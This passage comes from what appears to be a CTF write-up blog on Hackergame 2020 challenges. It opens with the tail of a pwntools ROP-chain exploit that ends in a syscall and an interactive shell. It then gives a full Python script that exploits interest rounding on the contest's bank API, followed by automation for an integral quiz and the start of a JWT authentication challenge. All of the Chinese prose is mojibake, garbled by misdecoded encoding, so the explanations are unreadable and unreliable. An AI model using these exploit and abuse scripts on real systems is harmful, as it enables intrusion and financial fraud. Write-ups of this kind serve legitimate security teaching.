rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000463af0) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000402bf4) # syscall payload += p sh.sendlineafter('such as (0,1): ', payload) sh.interactive() æ¥è‡ªæœªæ¥çš„ä¿¡ç¬ºï¼ˆå¤ç°ï¼‰ ä½ æ”¶åˆ°äº†ä¸€å°é‚®ä»¶ã€‚æ²¡æœ‰æ ‡é¢˜ï¼Œå¥‡å¥‡æ€ªæ€ªçš„å‘ä»¶äººï¼Œå’Œä¸€ä»½å¥‡æ€ªçš„é™„ä»¶ã€‚æ—¥æœŸæ˜¾ç¤ºçš„æ˜¯ 3020 å¹´ 10 æœˆ 31 æ—¥ã€‚ â€œSend from Arctic.â€ æ­£æ–‡å°±åªæœ‰è¿™ä¸€å¥è¯ã€‚ ã€Œè°æçš„æ¶ä½œå‰§å•Šâ€¦â€¦è¯è¯´è¿™ç«Ÿç„¶æ²¡æœ‰è¢«åƒåœ¾é‚®ä»¶è¿‡æ»¤å™¨è¿‡æ»¤æ‰ï¼Ÿã€ä½ ä¸€è¾¹å˜Ÿå›”ç€ä¸€è¾¹è§£å‹äº†é™„ä»¶â€”â€”åªçœ‹åˆ°ä¸€å †äºŒç»´ç å›¾ç‰‡ã€‚ çœ‹èµ·æ¥æœ‰ç‚¹æ„æ€ã€‚ä½ ä¸ç¦æƒ³è¯•è¯•ï¼Œèƒ½å¦ä»å…¶ä¸­å¾—åˆ°ä»€ä¹ˆæœ‰æ„ä¹‰çš„ä¸œè¥¿ã€‚ è¿™é¢˜åšçš„æ—¶å€™å·²ç»æƒ³åˆ°æ˜¯ GitHub Archive Program äº†ï¼Œä½†æ²¡æƒ³åˆ°çœŸå°±æ•´äº†ä¸€é¢˜ã€‚ ä¸€å †äºŒç»´ç ã€‚ç¬¬ä¸€å¼ å‡ºæ¥æ˜¯ä¸ª META. å‰å‡ å¼ äºŒç»´ç é‡Œæœ‰ä¸€å¼ å†…å®¹æ˜¯ GitHub çš„ API åˆ—è¡¨ã€‚å¯¹åº”çš„ä»“åº“æ˜¯ openlug/nonexistã€‚ ç„¶åæˆ‘çœŸå»æ‰¾äº†ï¼Œå‘ç°æ²¡æœ‰ï¼Œä¸€ç§å¯èƒ½æ˜¯ Private Repoï¼Œå¯èƒ½ä¹‹å‰æœ‰è¿‡ Publicï¼Ÿ äºæ˜¯å»æ‰¾äº†ä¸€äº›å…¬å¼€çš„ GitHub Archive ç½‘ç«™ï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°ã€‚ å¦ä¸€ç§å¯èƒ½å°±æ˜¯å‡çš„äº†ï¼ŒçœŸä¸å­˜åœ¨ã€‚ ä¸ç®¡äº†å…ˆæŠŠæ‰€æœ‰çš„äºŒç»´ç ç»™è§£ç å‡ºæ¥ï¼Œåˆå¹¶åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œã€‚ æ¯”èµ›åšé¢˜çš„æ—¶å€™ç”¨çš„ Python çš„ pyzbar åº“ï¼Œè¿˜ç‰¹åœ°æ³¨æ„äº†ç”¨ rb ä»¥äºŒè¿›åˆ¶æ¥å†™å…¥æ–‡ä»¶ï¼Œç„¶è€Œå‡ºæ¥çš„æ–‡ä»¶å•¥ä¹Ÿä¸æ˜¯â€¦â€¦å•¥æ–‡ä»¶å¤´éƒ½æ‰¾ä¸åˆ°ï¼Œå°±ç¦»è°±ã€‚ æ¯”èµ›ç»“æŸäº†æ‰çŸ¥é“æ˜¯è¿™ä¸ªè§£æåº“æœ¬èº«å­˜åœ¨é—®é¢˜ï¼Œåœ¨ \\x00 å¤„ä¼šæˆªæ–­ã€‚ å‚è€ƒå®˜æ–¹ WP ä»¥åŠ æ€»æ¦œ rk1 å¤§å¸ˆå‚…çš„ WPï¼Œå¯ä»¥ç”¨ zbarimg è¿™ä¸ªå‘½ä»¤è¡Œå·¥å…·æ¥è§£ç ã€‚ ï¼ˆè„è¯ä¸€å †ï¼Œåˆ«é—®ï¼Œé—®å°±æ˜¯è£… zbarimg å¿ƒæ€ç‚¸äº† è¿™é‡Œå°±ç”¨ Python è°ƒç”¨å‘½ä»¤è¡Œæ¥æ‰§è¡Œå¥½äº†ã€‚ import os file_list = list(os.walk('./frames'))[0][2] for f in file_list: fi = './frames/' + f cmd = 'zbarimg --raw -Sbinary %s &gt;&gt; frames.tar' os.system(cmd % fi) ç„¶åè¿™ä¸ªå‡ºæ¥çš„ frames.tar æ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹å†è§£å‹å°±èƒ½æ‹¿åˆ° flag äº†ã€‚ BTW, æ¯”èµ›ç»“æŸæ‰çŸ¥é“é‚£ä¸ª META å…¶å®å¹¶ä¸æ˜¯ä¸ª Private Repoï¼Œè€Œæ˜¯ openlug/django-commonï¼Œå°±å»å¹´ hackergame çš„ä¸€é“é¢˜ã€‚ã€‚ ç‹—ç‹—é“¶è¡Œè¿™é¢˜ä¹Ÿæœ‰ç‚¹æ„æ€ã€‚ å››èˆäº”å…¥è–…ç¾Šæ¯›å¤§æ³•å¥½å•Šã€‚ï¼ˆå½“ç„¶è¿™ä¹Ÿæ˜¯ä¸€ç§å¯è¡Œæ–¹æ¡ˆå•¦ï¼‰ å‚¨è“„å¡ åˆ©ç‡æ¯æ—¥ 0.3% å› æ­¤ äº”å…¥ æœ€å°‘éœ€è¦ 0.5/0.003=167ã€‚ ä¿¡ç”¨å¡ åˆ©ç‡æ¯æ—¥ 0.5%ï¼Œæœ€ä½ 10 æœ€åˆ’ç®—çš„è¯æ˜¯ 10/0.005=2000ï¼Œä¸”æ¬ æ¬¾åœ¨ 2000 åˆ° 2100 ä¹‹é—´æ¯æ—¥åˆ©æ¯éƒ½æ˜¯10ã€‚ æŠŠæ¬ æ¬¾æ§åˆ¶åœ¨è¿™ä¸ªèŒƒå›´å†…å°±èƒ½è–…ç¾Šæ¯›äº†ã€‚ 2000/167 =&gt; 12 å€Ÿæ¬¾åˆ†åˆ°12å¼ å‚¨è“„å¡ä¸­ã€‚ é¦–å…ˆå¼€6å¼ ä¿¡ç”¨å¡ï¼Œå¼€12*6å¼ å‚¨è“„å¡ï¼Œä¸”ä¾æ¬¡è½¬è´¦åˆ°å‚¨è“„å¡ï¼Œæ¯å¼ å¡167ï¼Œç¡®ä¿æ¯å¤©æœ‰1çš„åˆ©æ¯ã€‚ é¦–å…ˆç”¨åˆå§‹çš„å‚¨è“„å¡1000å…ƒåƒé¥­ï¼Œç­‰å‚¨è“„å¡ä½™é¢ &gt;= 177 çš„æ—¶å€™å°±èƒ½ç”¨å‚¨è“„å¡è¿˜æ¬¾+åƒé¥­äº†ã€‚ æœ€å¼€å§‹ç‚¹çš„æ‰‹ç´¯æ­»äº†ï¼Œæƒ³æƒ³ç®—äº†å†™è„šæœ¬å§ã€‚ é¦–å…ˆæŠŠå„ä¸ªæ–¹æ³•å°è£…å¥½ã€‚ # -*- coding: utf-8 -*- \"\"\" Hackergame 2020 ç‹—ç‹—é“¶è¡Œ @Author: MiaoTony @Time: 20201102 \"\"\" import requests import json url_prefix = r'http://202.38.93.111:10100/api/' headers = { \"Host\": \"202.38.93.111:10100\", \"Origin\": \"http://202.38.93.111:10100\", \"Referer\": \"http://202.38.93.111:10100/\", \"Content-Type\": \"application/json;charset=utf-8\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Connection\": \"keep-alive\", \"Cache-Control\": \"max-age=0\", \"Authorization\": \"Bearer &lt;your_token&gt;\", \"Cookie\": \"session=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\", } session = requests.Session() session.headers = headers def create_card(kind): \"\"\" åŠå¡ :param kind: {str} `credit`ä¿¡ç”¨å¡ï¼Œ`debit`å‚¨è“„å¡ \"\"\" url = url_prefix + 'create' payload = {\"type\": kind} r = session.post(url, json=payload) r.encoding = 'utf-8' print(r.text) return r.text def get_info(): \"\"\" è·å–ç”¨æˆ·ä¿¡æ¯ \"\"\" url = url_prefix + 'user' r = session.get(url) r.encoding = 'utf-8' # print(r.json()) return r.json() def get_balance(): \"\"\" è·å–å‡€èµ„äº§ \"\"\" info = get_info() accounts = info.get('accounts') balance = 0 for account in accounts: if account.get('type') == 'debit': balance += account.get('balance') if account.get('type') == 'credit': balance -= account.get('balance') return balance def get_debt(): \"\"\" è·å–æ¬ æ¬¾ \"\"\" info = get_info() accounts = info.get('accounts') for account in accounts: if account.get('type') == 'credit': debt = account.get('balance') break return debt def transfer(src, dst, amount): \"\"\" è½¬è´¦ \"\"\" url = url_prefix + 'transfer' payload = {\"src\": src, \"dst\": dst, \"amount\": amount} r = session.post(url, json=payload) r.encoding = 'utf-8' print(r.text) return r.text def eat(account): \"\"\" åƒé¥­ \"\"\" url = url_prefix + 'eat' payload = {\"account\": account} r = session.post(url, json=payload) r.encoding = 'utf-8' print(r.text) return r.text åŠå¡ã€è½¬è´¦ã€‚ # å…ˆåŠå¡ 1å‚¨è“„å¡ 2-7ä¿¡ç”¨å¡ 8-79å‚¨è“„å¡ for i in range(6): print(i) create_card('credit') for i in range(6 * 12): print(i) create_card('debit') info = get_info() # è½¬è´¦ï¼Œæ¯å¼ å¡è½¬167 for credit_id in range(2, 8): print(credit_id) for i in range(12): dst = 8 + 12 * (credit_id-2) + i amount = 167 transfer(src=credit_id, dst=dst, amount=amount) æœ€åæ˜¯æ¯å¤©ç¨³å®šèµš2ç‹—å¸ï¼Œå†™ä¸ªå¾ªç¯ã€‚ å½“æ¬ æ¬¾åˆ°äº†2104æ—¶ä¾æ¬¡ç”¨å‚¨è“„å¡è¿˜æ¬¾ï¼Œä¸€ç›´è¿˜åˆ°2004ï¼Œå¦åˆ™å°±æ¯å¤©æ°é¥­é¡ºä¾¿è–…ç¾Šæ¯›ã€‚ debit_card_id = 8 # å‚¨è“„å¡ credit_card_id = 2 # ä¿¡ç”¨å¡ while True: debt = get_debt() if get_debt() == 2104: for i in range(10 * 6): print(i) # ä¾æ¬¡ç”¨åé¢çš„å‚¨è“„å¡ç»™ä¿¡ç”¨å¡è¿˜æ¬¾ transfer(debit_card_id, credit_card_id, 10) debit_card_id += 1 credit_card_id += 1 if credit_card_id &gt; 7: credit_card_id = 2 if debit_card_id &gt; 79: debit_card_id = 8 print(\"==============================\") print(get_balance()) eat(debit_card_id) debit_card_id += 1 if debit_card_id &gt; 79: debit_card_id = 8 if get_balance() &gt;= 2000: print(get_info()) break è·‘äº†è´¼ä¹…ï¼Œç»ˆäºå¾—åˆ° flag äº†ã€‚ è¶…åŸºç¡€çš„æ•°ç†æ¨¡æ‹Ÿå™¨ï¼ˆå¤ç°ï¼‰ è¿™é¢˜éœ€è¦æœ‰å¾ˆæ‰å®çš„æ•°ç†åŸºç¡€æ‰è¡Œâ€¦â€¦ï¼ˆåºŸè¯ ç¬¬ä¸€ç§è§£æ³•æ˜¯æ‰‹ç®—æˆ–è€…ç›´æ¥æŒ‰è®¡ç®—å™¨ï¼Œä½†æˆ‘æŒ‰äº†å‡ é¢˜æ”¾å¼ƒäº†ã€‚ å¦å¤–ä¸€ç§æ˜¯å€ŸåŠ©ç½‘ç»œä¸Šå…¬å¼€çš„è®¡ç®—å™¨ï¼Œå‡†å¤‡çˆ¬ä¸ªæ¥å£æˆ–è€…è‡ªå·±æ„é€ ä¸€ä¸ªæ¥å£æ¥ç”¨ï¼Œæœéäº†å‘ç°æœ‰å‡ ä¸ªå¯èƒ½å¯ä»¥ç”¨çš„ï¼š ä¸€æ­¥æ­¥è§£çš„è®¡ç®—å™¨ symbolab å®šç§¯åˆ†è®¡ç®—å™¨ WolframAlpha etc. ç„¶è€Œå‘ç°éƒ½ä¸èƒ½ç›´æ¥è§£æé¢˜ç›®æ‰€ç»™çš„ LaTeXï¼Œæˆ–è€…è§£ä¸å‡ºæ¥ï¼Œå†æˆ–è€…è§£å‡ºæ¥çš„è¯ç²¾åº¦ä¹Ÿä¸å¤Ÿâ€¦â€¦ è¿˜æœ‰ä¸€ç§æ–¹æ¡ˆï¼Œæ˜¯è°ƒç”¨æœ¬åœ°çš„æœåŠ¡è§£æ LaTeXï¼Œå†è¿›è¡Œç§¯åˆ†è¿ç®—ã€‚ äºæ˜¯æƒ³åˆ°äº†æŸçº¢è‰²è½¯ä»¶ï¼ŒMathematicaï¼Œåˆç§° MMAã€‚ æ—©å°±å¬è¯´è¿™ç©æ„ç¬¦å·è®¡ç®—è´¼å‰å®³äº†ï¼Œè™½ç„¶ä¹‹å‰ä¹Ÿæ²¡ç”¨è¿‡ï¼Œè¿˜æ˜¯æ¯”èµ›ç°è£…ç°å­¦çš„ï¼Œä½†ç”¨äº†å°±å‘ç°çœŸçš„å¼ºï¼Œå¤ªé¦™äº†ï¼Œæ—©çŸ¥é“ç”¨æ¥è§£é«˜æ•°é‡Œçš„å¾®ç§¯åˆ†é¢˜å¤šå¥½ã€‚ æœäº†æœå‘ç° MMA æ”¯æŒè§£æ LaTeX è¡¨è¾¾å¼ï¼Œå¤ªå¥½äº†ï¼ åŸç†å°±æ˜¯ç”¨ Python çš„ requests åº“æŠŠé¢˜ç›®ç½‘é¡µçˆ¬ä¸‹æ¥ï¼Œç”¨ Beautifulsoup è§£æå¾—åˆ° LaTeX å…¬å¼ï¼Œè°ƒç”¨ MMA è§£æè¡¨è¾¾å¼å¹¶è¿›è¡Œç§¯åˆ†è¿ç®—ï¼Œæœ€åç”¨ requests æäº¤ç­”æ¡ˆï¼Œåšä¸€ä¸ªå¾ªç¯è§£ä¸ª400é¢˜å°±å®Œäº‹äº†ã€‚ å‚è€ƒ Wolfram å®˜æ–¹æ–‡æ¡£ ç”Ÿæˆå’Œå¯¼å…¥ TeXï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„è¯­å¥å°† LaTeX è½¬æ¢ä¸º MMA çš„è¡¨è¾¾å¼ã€‚ ToExpression[\"input\",TeXForm] ä½†ç”±äº MMA ä¸æ”¯æŒè¿™ä¸ªé¢˜ç›®ç»™çš„è¿™ä¸ª LaTeX æ ¼å¼ï¼Œéœ€è¦æŠŠç§¯åˆ†ä¸Šä¸‹é™æå–å‡ºæ¥ï¼Œæœ€åçš„ {d x} ä¹Ÿè¦æ›¿æ¢ä¸º dxï¼Œæ‰€æœ‰çš„å•æ–œæ  \\ è¦æ›¿æ¢ä¸ºåŒæ–œæ  \\\\ï¼Œç§¯åˆ†è¡¨è¾¾å¼ä¹Ÿè¦ç”¨ \\\\left( \\\\right) åŒ…å«èµ·æ¥ã€‚ å¥½äº†ï¼Œç°åœ¨åœ¨ MMA é‡Œè°ƒå¥½èƒ½è§£æ LaTeX å¹¶ç§¯åˆ†äº†ï¼Œä¸‹é¢æ¥æ•´å’Œ Python çš„æ¥å£ã€‚ å‚è€ƒ wolfram å®˜æ–¹æ–‡æ¡£ Wolfram Client Library for Pythonï¼Œå®˜æ–¹æä¾›äº†ä¸€ä¸ªå®¢æˆ·ç«¯è¿›è¡Œäº¤äº’ï¼Œä¹Ÿå¯ä»¥åœ¨ MMA é‡Œè°ƒç”¨ Python æ‰§è¡Œã€‚ ç„¶è€Œï¼å…¶ä»–éƒ½èƒ½ç”¨ï¼Œä¸€æŠŠä¸Šè¿°è°ƒå¥½çš„è§£æ LaTeX çš„ä»£ç ç”¨è¿™ä¸ª client æ‰§è¡Œï¼Œç»ˆç«¯å°±å¡æ­»äº†ï¼Œå•¥ååº”æ²¡æœ‰ï¼Œäººå‚»äº†ã€‚è¯•äº†å¥½ä¹…ä¸çŸ¥é“æ˜¯æˆ‘å†™çš„é—®é¢˜è¿˜æ˜¯ä»–æœ¬èº«çš„é—®é¢˜äº†ã€‚ã€‚ æœ€åå®åœ¨ä¸è¡Œï¼Œæ”¹ç”¨å‘½ä»¤è¡Œæ‰§è¡Œï¼Œå¯ä»¥è°ƒç”¨å®‰è£…ç›®å½•ä¸‹çš„ wolframscript -code &lt;CodeHere&gt; æ¥æ‰§è¡Œä»£ç ã€‚å°±ç±»ä¼¼äº Python çš„ python3 -c &lt;CodeHere&gt; ç”¨æ³•ã€‚ ç„¶è€Œå‘ç°ä¹Ÿä¸è¡Œï¼Œå¯èƒ½ç”±äºå¼•å·å’Œ[ ]çš„é—®é¢˜è¯­æ³•ä¸å¯¹æ‰§è¡Œå¤±è´¥äº†ã€‚ æœ€åæ²¡åŠæ³•äº†ï¼Œå¹²è„†ç›´æ¥è·‘ä¸ªç»ˆç«¯å§ã€‚ å‚è€ƒ windowsä¸‹python3å¦‚ä½•è°ƒç”¨mathematicaè¿›è¡Œé«˜çº§è®¡ç®— è¿™ä¸€ç¯‡ï¼Œç”¨ winpexpect æ¥è¿›è¡Œäº¤äº’å¼æ“ä½œã€‚ ï¼ˆå‘ç°æœ‰å¤§å¸ˆå‚…ç›´æ¥ç”¨ pwntools è¿›è¡Œäº¤äº’ï¼Œå…¶å®ä¹Ÿè¡Œ 2333. å…·ä½“ç°åœ¨ä¸€ä¼šå„¿è¿˜è¯´ä¸æ¸…æ¥šï¼Œåé¢ä¸“é—¨å†™ä¸€ç¯‡è®²è¿™ä¸ªäº¤äº’çš„å§ï¼Œä»£ç è¿˜æ²¡ä¼˜åŒ–å¥½ï¼Œç»ˆç«¯è¶…æ—¶è¿˜æ²¡å¤„ç†å¥½ä»¥è‡³äºä¼šå¼€ä¸€å †ç»ˆç«¯â€¦â€¦ åæ­£å°±è°ƒç”¨ MMA å»è®¡ç®—ï¼Œç„¶åè¾“å‡ºç»“æœè¯»è¿›æ¥ï¼Œè°ƒç”¨ /submit æ¥å£æäº¤ç­”æ¡ˆã€‚ å¥½ä¸å®¹æ˜“åˆ°è¿™ä¸€æ­¥éƒ½å·®ä¸å¤šäº†ï¼Œå¿ƒæ€å·²ç»ç‚¸çš„ä¸è¡Œäº†ï¼ˆå·²ç»è°ƒäº†ä¸€ä¸‹åˆäº†ï¼‰ã€‚ç»“æœå‘ç°æ€ä¹ˆä¸€ç›´å¡åœ¨ 399 é¢˜ä¸‹ä¸å»ï¼Ÿï¼Ÿï¼Ÿ å¼€å§‹æ€€ç–‘æˆ‘ POST è¯·æ±‚å‚æ•°æ˜¯ä¸æ˜¯ä¸å¯¹ï¼Œé¢˜ç›®éœ€è¦çš„æ˜¯ x-www-form-urlencodedï¼Œéš¾ä¸æˆæ•´äº† form-data æˆ–è€…å…¶ä»–çš„ï¼Ÿ ç”¨ httpbin è¯•äº†è¯•ï¼Œåˆåœ¨ VPS ä¸Šæ­äº†ä¸ªæ¥å£æ¥æ”¶è¯•äº†è¯•ï¼Œæ²¡æ¯›ç—…å•Šâ€¦â€¦ å†çœ‹ä»£ç ï¼Œéš¾ä¸æˆ cookie ç‚¸äº†ã€‚å†™äº†æŒºå¤šçˆ¬è™«äº†ï¼Œä¸€èˆ¬éƒ½ç”¨ requests.Session() ç»´æŒ Cookie çŠ¶æ€ï¼Œä¹‹å‰ä¹Ÿæ²¡ç¢°åˆ°ç‚¸çš„ï¼Œä¸ä¼šè¿™é‡Œåæ‰å§ã€‚ å†å»ç ”ç©¶äº†äº¿æ¬¡æäº¤è¿‡ç¨‹ï¼Œå‘ç° POST ä¼šå¸¦ä¸Šæ­¤æ—¶çš„ Cookieï¼Œè¿”å›ä¸€ä¸ª302è·³è½¬ï¼ŒåŒæ—¶ Set-Cookieï¼Œè·³è½¬ä¹‹å GET æ–¹æ³•å¸¦ä¸Šæ–°çš„ Cookie å»è®¿é—®æ ¹ç›®å½•ï¼Œå¾—åˆ°è¿”å›çš„åŒæ—¶åˆè®¾ç½®äº†æ–°çš„ Cookieã€‚ æ‰‹åŠ¨ç”¨ Postman æ¨¡æ‹Ÿäº†ä¸€ä¸‹ï¼Œå¦‚æœï¼ˆè·Ÿéš 302 è·³è½¬ï¼‰ä¸åŠæ—¶æ›´æ–° Cookie çš„è¯ï¼Œç¡®å®ä¼šä¸€ç›´å¡åœ¨ä¹‹å‰çš„çŠ¶æ€ï¼Œç”šè‡³è¿ ç­”æ¡ˆæ­£ç¡®ã€ç­”æ¡ˆé”™è¯¯ä¹‹ç±»çš„è¯éƒ½ä¸€æ¨¡ä¸€æ ·ï¼Œè¿˜éœ€è§£ç­”çš„é¢˜ç›®æ•°é‡ä¹Ÿä¸å˜ï¼Œå¤ªè‰äº†ï¼ äºæ˜¯æ¯”èµ›çš„æ—¶å€™å°±å¡è¿™é‡Œäº†ã€‚åˆè°ƒäº†ä¸€æ™šä¸Šå¿ƒæ€å½»åº•ç‚¸äº†ã€‚ã€‚ ï¼ˆåæ¥å°±æ²¡æ‰“äº† ç°åœ¨æƒ³æƒ³åº”è¯¥æ˜¯æˆ‘æŠŠåˆå§‹çš„ Cookie å†™åˆ°äº† Headers é‡Œçš„åŸå› å§ï¼Œåé¢å•ç‹¬è®¾ç½® cookieï¼Œæ…¢æ…¢ä¼˜åŒ–ä»£ç å†è¯•è¯•ã€‚ 20201109 Update: ä¼˜åŒ–äº†äº¿ä¸‹ï¼Œç°åœ¨å·®ä¸å¤šäº†ï¼Œèƒ½æµç•…æ±‚è§£äº†ï¼Œåé¢ä¸“é—¨å†™ä¸€ç¯‡è®²è®² Python å’Œ MMA äº¤äº’çš„ã€‚ ï¼ˆç•™å‘ï¼‰ å…ˆç®€å•è¯´ä¸€è¯´å§ã€‚ å‚è€ƒ Mathematica è®¡ç®—å¼ï¼š NIntegrate[ToExpression[\"\\\\sqrt{x} + \\\\frac{5}{x} + \\\\ln\\\\left(x\\\\right) + \\\\sin\\\\left(\\\\ln\\\\left(x\\\\right)\\\\right)\",TeXForm],{x,ToExpression[\"\\\\frac{2}{3}\",TeXForm],ToExpression[\"\\\\frac{4}{3}\",TeXForm]},WorkingPrecision-&gt;12] ä¹‹å‰è¯•äº†ç›´æ¥ç”¨ ToExpression æŠŠåŒ…å« \\\\int_{}^{} çš„ç§¯åˆ†è¡¨è¾¾å¼å…¨éƒ¨å†™è¿›å»ï¼Œä½†å‘ç°è®¡ç®—é€Ÿåº¦ç‰¹åˆ«æ…¢ï¼Œç”šè‡³ä¼šå¡æ­»ï¼Œè€Œä¸”ç»“æœä¹Ÿä¸å¯¹ã€‚ è¿˜æ˜¯å•ç‹¬æŠŠè¢«ç§¯è¡¨è¾¾å¼ã€ä¸Šä¸‹é™æå–å‡ºæ¥ï¼Œç”¨è‡ªå¸¦çš„ NIntegrate ç§¯åˆ†æ±‚è§£ï¼Œé¡ºä¾¿æŒ‡å®šç²¾åº¦æ¥çš„å®åœ¨ã€‚ å¦å¤–ï¼Œè¿™ä¸ªé¢˜ç›®å¡åœ¨ 399 é¢˜ä¸‹ä¸å»çš„åŸå› åº”è¯¥æ˜¯åˆå§‹æ—¶å€™çš„ Cookie è®¾ç½®ä¸å¯¹ï¼Œåœ¨302è·³è½¬çš„è®¾ç½®ä¸Šï¼Œç»æµ‹è¯•ï¼Œallow_redirects æ— è®ºæ˜¯ True æˆ–è€… Falseï¼ŒCookie éƒ½èƒ½æ­£ç¡®æ›´æ–°ï¼Œä¹Ÿå°±æ˜¯è¯´ç”¨ requests.Session() æ¥ç»´æŒ Cookie çŠ¶æ€æ˜¯æ²¡é—®é¢˜çš„ã€‚ åœ¨æœ€å¼€å§‹çš„æ—¶å€™åŠ ä¸Šä¸€ä¸ªç™»å½•ï¼ŒæŠŠè‡ªå·±çš„ token å¸¦ä¸Šå°±èƒ½è§£å†³é—®é¢˜äº†ï¼Œä¸allow_redirects è®¾ç½®æ— å…³ã€‚è¿™é¢˜ç”šè‡³è¿ headers éƒ½ä¸éœ€è¦è®¾ç½®ã€‚ å‚è€ƒä»£ç å¦‚ä¸‹ã€‚ from urllib.parse import quote_plus import requests session = requests.Session() token = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' resp = session.get( f\"http://202.38.93.111:10190/login?token={quote_plus(token)}\") print(resp.cookies) # ... çœ‹äº†å®˜æ–¹ WP å‘ç° Python é‡Œçš„ sympy åº“å±…ç„¶è‡ªå¸¦æœ‰è§£æ LaTeX çš„ï¼Œå®³ï¼Œè¿˜æ˜¯å¤ªèœäº†ã€‚ æ™®é€šçš„èº«ä»½è®¤è¯å™¨ è¿‘æ—¥ï¼Œå° T æ¥æ‰‹äº†æŸä¸ªè€æ—§ Python ç½‘ç«™çš„é‡æ„å·¥ä½œã€‚æ¥æ‰‹ä¹‹åï¼Œä»–æŠŠåŸå…ˆçš„ requirements.txt å¤åˆ¶åˆ°äº†æ–°é¡¹ç›®ä¸‹ï¼Œæ›´æ¢äº†åç«¯æ¡†æ¶ï¼Œç…§ç€æ¡†æ¶æ–‡æ¡£é­”æ”¹äº†èº«ä»½è®¤è¯éƒ¨åˆ†çš„å†…å®¹ï¼Œå†™å‡ºäº†ä¸€ä¸ªæµ‹è¯•ç”¨çš„åŸå‹ã€‚çœ‹èµ·æ¥ä¸€åˆ‡éƒ½å¾ˆæ­£å¸¸ï¼Œåªæ˜¯ä»–ä¼¼ä¹æ²¡æœ‰ä»”ç»†æ£€æŸ¥æ¯ä¸€é¡¹ä¾èµ–çš„ç‰ˆæœ¬ã€‚ ã€Œæ‡’å¾—ç®¡äº†ï¼Œåˆä¸æ˜¯ä¸èƒ½ç”¨ï¼ã€ä½†æœçœŸå¦‚æ­¤å—ï¼Ÿ ç™»å½•åä¼šè¿”å›ä¸€ä¸ª access_tokenï¼Œbase64 è§£ç ä¸€ä¸‹å¾ˆæ˜æ˜¾æ˜¯ JWTã€‚å½“ç„¶ JavaScript ä»£ç é‡Œé€»è¾‘ä¹Ÿå¾ˆæ˜æ˜¾äº†ã€‚ {\"typ\":\"JWT\",\"alg\":\"RS256\"}.{\"sub\":\"guest\",\"exp\":1604399671}......... ä¸€ä¸ª JWT å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šå¤´éƒ¨ Headerã€è½½è· Payload ä¸ç­¾å 